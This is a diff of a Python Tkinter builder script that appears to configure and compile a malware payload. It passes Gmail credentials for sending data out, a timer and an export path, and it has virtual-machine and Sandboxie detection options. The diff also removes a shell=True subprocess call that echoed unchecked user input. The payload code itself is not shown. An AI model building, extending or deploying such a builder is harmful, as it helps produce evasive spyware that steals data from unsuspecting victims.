@@ -1,6 +1,5 @@
-from threading import Thread
 from tkinter import *
-import subprocess, os, shutil
+import os, shutil
 from tkinter import messagebox
 
 python_path = "\"" + os.path.dirname(sys.executable)
@@ -22,7 +21,7 @@ def save_file(constructor, gmail_args):
 
     # use loop in order to ensure that line number doesnt matter
     for i in range(0, len(file_contents)):
-        if file_contents[i] == "if __name__ == \"__main__\":\n":
+        if file_contents[i][0:len("if __name__ == \"__main__\":")] == "if __name__ == \"__main__\":":
             break
 
     file_contents = file_contents[:i]
@@ -129,24 +128,19 @@ class setup:
         self.btn_check_vm.configure(state="disabled")
         self.btn_check_sandboxie.configure(state="disabled")
 
-        constructor_args = f"({self.txt_time.get()}, \"{self.replace_env_var()}\", {self.config_bool[0]}, " \
+        constructor_args = f"({self.txt_time.get()}, \"{self.txt_export.get()}\", {self.config_bool[0]}, " \
                            f"{self.config_bool[1]}, {self.config_bool[2]}, {self.config_bool[3]})"
 
         if self.use_gmail: gmail_args = f"(\"{self.txt_username.get()}\", \"{self.txt_pass.get()}\")"
 
         self.root.withdraw()
+
         save_file(constructor_args, gmail_args)
         build()
+
+        messagebox.showinfo("Build", "Finished!")
+
         self.root.destroy()
-
-    def replace_env_var(self):
-        command = subprocess.Popen(f"echo {self.txt_export.get()}", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
-        output = ((command.stdout.read()).decode("utf-8").splitlines()[0]).replace("\\", "/")  # decode and remove new line
-
-        self.txt_export.delete(0, END)
-        self.txt_export.insert(0, output)
-
-        return output
 
 
 if __name__ == "__main__":
